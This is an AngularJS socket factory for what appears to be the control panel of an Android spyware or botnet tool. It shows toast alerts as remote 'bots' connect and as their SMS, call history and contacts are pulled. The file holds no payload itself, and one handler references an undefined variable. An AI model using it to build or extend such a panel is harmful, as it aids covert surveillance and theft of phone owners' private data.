App
.factory('socket', [
  'socketFactory',
  'toastr',
  '$rootScope',
  function(socketFactory, toastr, $rootScope) {
    var reconnectTime = 5; //s
    var socket = socketFactory();

    socket.on('disconnect', function() {
      toastr.warning('Panel is offline', 'Disconnected');
      $rootScope.connected = false
    })

    socket.on('connect', function() {
      socket.emit('admin')
      $rootScope.connected = true
    })

    socket.on('reconnect', function() {
      socket.emit('admin')
      $rootScope.connected = true
      toastr.clear();
      toastr.success('Panel is connected', 'Info')

    })

    socket.on('bot:created', function(data) {
      toastr.success('New device has connected (' + device.uid + ')', data.device)
    })

    socket.on('bot:connected', function(device) {
      toastr.success('Device has connected (' + device.uid + ')', device.device)
    });

    socket.on('bot:disconnected', function(device) {
      toastr.error('Device has disconnected (' + device.uid + ')', device.device)
    });

    socket.on('getmessages:started', function(device) {
      toastr.info('Get SMS started.', device.device)
    })
    socket.on('getmessages:done', function(device) {
      toastr.success('Done getting SMS.', device.device)
    })

    socket.on('getcallhistory:started', function(device) {
      toastr.info('Get call history started.', device.device)
    })
    socket.on('getcallhistory:done', function(device) {
      toastr.success('Done getting call history.', device.device)
    })

    socket.on('nopermission', function(data) {
      console.log(data)
      toastr.error('App is denied a permission: ' + data.permission, data.device)
    })

    socket.on('download:started', function(data) {
      toastr.info('Download started', data.device)
    })

    socket.on('download:completed', function(data) {
      console.log(data)
      toastr.success('Download completed', data.device)
    })

    socket.on('download:error', function(data) {
      toastr.error(data.error, data.device)
    })

    socket.on('getcontacts:started', function(data) {
      toastr.info('Get contacts started.', data.device)
    })

    socket.on('getcontacts:completed', function(data) {
      toastr.success('Get contacts completed.', data.device)
    })

    socket.on('command:unknown', function(data) {
      toastr.error('Unknown command: "'+data.command+'"', data.device)
    })

    return socket;
  }
])
